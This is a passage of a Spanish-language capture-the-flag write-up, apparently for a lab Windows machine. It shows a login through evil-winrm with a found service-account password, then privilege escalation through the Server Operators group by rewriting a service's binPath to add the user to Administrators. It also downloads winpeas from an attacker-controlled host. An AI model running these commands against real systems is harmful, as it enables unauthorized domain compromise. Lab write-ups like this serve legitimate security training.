+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="p">&gt;</span> <span class="n">smbclient</span> <span class="p">\\\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">108</span><span class="p">\\</span><span class="n">C</span><span class="p">$</span> <span class="n">-U</span> <span class="n">svc-printer</span> 
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="n">Enter</span> <span class="n">WORKGROUP</span><span class="p">\</span><span class="n">svc-printer</span><span class="s1">&#39;s password: </span>
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="s1">Try &quot;help&quot; to get a list of possible commands.</span>
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="s1">smb: \&gt; dir</span>
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="s1">$Recycle.Bin                      DHS        0  Sat Sep 15 09:19:00 2018</span>
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="s1">Config.Msi                        DHS        0  Mon Sep 27 13:46:53 2021</span>
+<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="s1">Documents and Settings          DHSrn        0  Thu May 20 21:08:51 2021</span>
+<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="s1">inetpub                             D        0  Thu May 20 16:19:09 2021</span>
+<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="s1">pagefile.sys                      AHS 738197504  Mon Aug 15 12:54:09 2022</span>
+<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="s1">PerfLogs                            D        0  Sat Sep 15 09:19:00 2018</span>
+<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="s1">Program Files                      DR        0  Mon Sep 27 13:46:28 2021</span>
+<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="s1">Program Files (x86)                 D        0  Wed May 26 11:57:54 2021</span>
+<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="s1">ProgramData                        DH        0  Mon Sep 27 13:46:01 2021</span>
+<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="s1">Recovery                         DHSn        0  Tue Jul 13 12:02:13 2021</span>
+<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="s1">System Volume Information         DHS        0  Thu May 20 14:42:27 2021</span>
+<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="s1">Users                              DR        0  Wed May 26 10:51:28 2021</span>
+<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="s1">Windows                             D        0  Mon Sep 27 13:49:07 2021</span>
+<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>
+<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a><span class="s1">&gt; evil-winrm -i 10.10.11.108 -u &quot;svc-printer&quot; -p &#39;</span><span class="n">1edFg43012</span><span class="p">!!</span><span class="s1">&#39;</span>
+<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>
+<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="s1">&gt;&gt; *Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; whoami</span>
+<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="s1">return\svc-printer</span>
+<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>
+<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="s1">&gt;&gt;*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; cat user.txt</span>
+<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="s1">c1f2c9b2c96d15f83dce949a6f854118</span>
+<a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>
+<a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="s1">&gt;&gt; *Evil-WinRM* PS C:\Users&gt; (Get-Acl -Path &#39;</span><span class="n">C</span><span class="p">:\</span><span class="n">users</span><span class="p">\</span><span class="n">administrator</span><span class="err">&#39;</span><span class="p">).</span><span class="n">access</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-Autosize</span>
+<a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>
+<a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="n">FileSystemRights</span> <span class="n">AccessControlType</span> <span class="n">IdentityReference</span>      <span class="n">IsInherited</span>                <span class="n">InheritanceFlags</span> <span class="n">PropagationFlags</span>
+<a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="p">----------------</span> <span class="p">-----------------</span> <span class="p">-----------------</span>      <span class="p">-----------</span>                <span class="p">----------------</span> <span class="p">----------------</span>
+<a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>    <span class="n">FullControl</span>             <span class="n">Allow</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>          <span class="n">False</span> <span class="n">ContainerInherit</span><span class="p">,</span> <span class="n">ObjectInherit</span>             <span class="n">None</span>
+<a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>    <span class="n">FullControl</span>             <span class="n">Allow</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>       <span class="n">False</span> <span class="n">ContainerInherit</span><span class="p">,</span> <span class="n">ObjectInherit</span>             <span class="n">None</span>
+<a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>    <span class="n">FullControl</span>             <span class="n">Allow</span> <span class="k">RETURN</span><span class="p">\</span><span class="n">Administrator</span>         <span class="n">False</span> <span class="n">ContainerInherit</span><span class="p">,</span> <span class="n">ObjectInherit</span>             <span class="n">None</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="escalate-privileges-server-operator">Escalate privileges (Server Operator)</h2>
+<ul>
+<li>
+<p>Se debe tener en cuenta que con los permisos del grupo "Server Operator" se pueden modificar, parar, e iniciar servicios:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&gt; *Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; net user svc-printer
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>User name                    svc-printer
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Full Name                    SVCPrinter
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Comment                      Service Account for Printer
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>User&#39;s comment
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Country/region code          000 (System Default)
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Account active               Yes
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>Account expires              Never
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>Password last set            5/26/2021 1:15:13 AM
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>Password expires             Never
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>Password changeable          5/27/2021 1:15:13 AM
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>Password required            Yes
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>User may change password     Yes
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>Workstations allowed         All
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>Logon script
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>User profile
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>Home directory
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>Last logon                   8/15/2022 9:39:53 AM
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>Logon hours allowed          All
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>Local Group Memberships      *Print Operators      *Remote Management Use
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>                            *Server Operators
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>Global Group memberships     *Domain Users
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>The command completed successfully.
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>&gt; *Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; whoami /priv
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>PRIVILEGES INFORMATION
+<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>----------------------
+<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>
+<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>Privilege Name                Description                         State
+<a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a>============================= =================================== =======
+<a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a>SeMachineAccountPrivilege     Add workstations to domain          Enabled
+<a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a>SeLoadDriverPrivilege         Load and unload device drivers      Enabled
+<a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a>SeSystemtimePrivilege         Change the system time              Enabled
+<a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a>SeBackupPrivilege             Back up files and directories       Enabled
+<a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a>SeRestorePrivilege            Restore files and directories       Enabled
+<a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a>SeShutdownPrivilege           Shut down the system                Enabled
+<a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+<a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+<a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a>SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+<a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a>SeTimeZonePrivilege           Change the time zone                Enabled
+</code></pre></div>
+</li>
+<li>
+<p>Se descarga Winpeas para hacer una enumeración:</p>
+<blockquote>
+<p><code>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; iwr http://10.10.14.11/winpeas.exe -outfile winpeas.exe</code></p>
+<p><code>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; ./winpeas.exe</code></p>
+</blockquote>
+</li>
+<li>
+<p>De forma mas sencilla se pueden enumerar los servicios directamente:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Se aprecia servicio con permisos de System:</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="p">&gt;</span> <span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc-printer</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="nb">sc </span><span class="n">qc</span> <span class="n">VGAuthService</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="no">[SC]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">SERVICE_NAME</span><span class="p">:</span> <span class="n">VGAuthService</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>        <span class="nb">TYPE </span>              <span class="p">:</span> <span class="n">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>        <span class="n">START_TYPE</span>         <span class="p">:</span> <span class="n">2</span>   <span class="n">AUTO_START</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>        <span class="n">ERROR_CONTROL</span>      <span class="p">:</span> <span class="n">1</span>   <span class="n">NORMAL</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>        <span class="n">BINARY_PATH_NAME</span>   <span class="p">:</span> <span class="s2">&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>        <span class="n">LOAD_ORDER_GROUP</span>   <span class="p">:</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>        <span class="n">TAG</span>                <span class="p">:</span> <span class="n">0</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>        <span class="n">DISPLAY_NAME</span>       <span class="p">:</span> <span class="n">VMware</span> <span class="k">Alias</span> <span class="n">Manager</span> <span class="n">and</span> <span class="n">Ticket</span> <span class="n">Service</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>        <span class="n">DEPENDENCIES</span>       <span class="p">:</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>        <span class="n">SERVICE_START_NAME</span> <span class="p">:</span> <span class="n">LocalSystem</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="c"># Incluimos el user svc-printer a grupo de administrators:</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="p">&gt;</span> <span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc-printer</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="nb">sc </span><span class="n">config</span> <span class="n">VGAuthService</span> <span class="n">binPath</span><span class="p">=</span> <span class="s2">&quot;cmd /c net localgroup Administrators svc-printer /add&quot;</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="no">[SC]</span> <span class="n">ChangeServiceConfig</span> <span class="n">SUCCESS</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="c"># Se para el servicio ya que esta corriendo actualmente:</span>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="p">&gt;</span> <span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc-printer</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="nb">sc </span><span class="n">stop</span> <span class="n">VGAuthService</span>
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="n">SERVICE_NAME</span><span class="p">:</span> <span class="n">VGAuthService</span>
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>        <span class="nb">TYPE </span>              <span class="p">:</span> <span class="n">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>        <span class="n">STATE</span>              <span class="p">:</span> <span class="n">1</span>  <span class="n">STOPPED</span>
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>        <span class="n">WIN32_EXIT_CODE</span>    <span class="p">:</span> <span class="n">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>        <span class="n">SERVICE_EXIT_CODE</span>  <span class="p">:</span> <span class="n">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>        <span class="n">CHECKPOINT</span>         <span class="p">:</span> <span class="n">0x0</span>
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>        <span class="n">WAIT_HINT</span>          <span class="p">:</span> <span class="n">0x0</span>
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="c"># Y se vuelve a iniciar para que ejecute nuesto código malicioso:</span>
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="p">&gt;</span> <span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc-printer</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="nb">sc start </span><span class="n">VGAuthService</span>
+<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a><span class="no">[SC]</span> <span class="n">StartService</span> <span class="n">FAILED</span> <span class="n">1053</span><span class="p">:</span>
+<a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>
+<a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="n">The</span> <span class="n">service</span> <span class="n">did</span> <span class="n">not</span> <span class="n">respond</span> <span class="n">to</span> <span class="n">the</span> <span class="nb">start </span><span class="n">or</span> <span class="n">control</span> <span class="n">request</span> <span class="k">in</span> <span class="n">a</span> <span class="n">timely</span> <span class="n">fashion</span><span class="p">.</span>
+<a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a>
+<a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a><span class="c"># Comprobamos que se ha ejecutado nuestro código:</span>
+<a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a><span class="p">&gt;</span> <span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc-printer</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span>
+<a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a><span class="k">Alias</span> <span class="n">name</span>     <span class="n">administrators</span>
+<a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a><span class="n">Comment</span>        <span class="n">Administrators</span> <span class="n">have</span> <span class="n">complete</span> <span class="n">and</span> <span class="n">unrestricted</span> <span class="n">access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">computer</span><span class="p">/</span><span class="n">domain</span>
+<a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a>
+<a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a><span class="n">Members</span>
+<a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a>
+<a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-3-45" name="__codelineno-3-45" href="#__codelineno-3-45"></a><span class="n">Administrator</span>
+<a id="__codelineno-3-46" name="__codelineno-3-46" href="#__codelineno-3-46"></a><span class="n">Domain</span> <span class="n">Admins</span>
+<a id="__codelineno-3-47" name="__codelineno-3-47" href="#__codelineno-3-47"></a><span class="n">Enterprise</span> <span class="n">Admins</span>
+<a id="__codelineno-3-48" name="__codelineno-3-48" href="#__codelineno-3-48"></a><span class="n">svc-printer</span>
+<a id="__codelineno-3-49" name="__codelineno-3-49" href="#__codelineno-3-49"></a><span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+<a id="__codelineno-3-50" name="__codelineno-3-50" href="#__codelineno-3-50"></a>
+<a id="__codelineno-3-51" name="__codelineno-3-51" href="#__codelineno-3-51"></a><span class="c"># Y por último tras salir y volver a entrar ya nos aplican los permisos del grupo de administradores locales:</span>
+<a id="__codelineno-3-52" name="__codelineno-3-52" href="#__codelineno-3-52"></a><span class="p">&gt;</span> <span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">administrator</span><span class="p">\</span><span class="n">desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-3-53" name="__codelineno-3-53" href="#__codelineno-3-53"></a><span class="n">3aac5fdbc4b66b914df7797619328429</span>
+</code></pre></div>
+</li>
+</ul>
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../arkham/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Arkham" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Arkham
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../../recursos/docker/" class="md-footer__link md-footer__link--next" aria-label="Next: Docker" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Docker
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["toc.integrate"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.6c7ad80a.min.js"></script>
+      
+    
+  </body>
+</html>
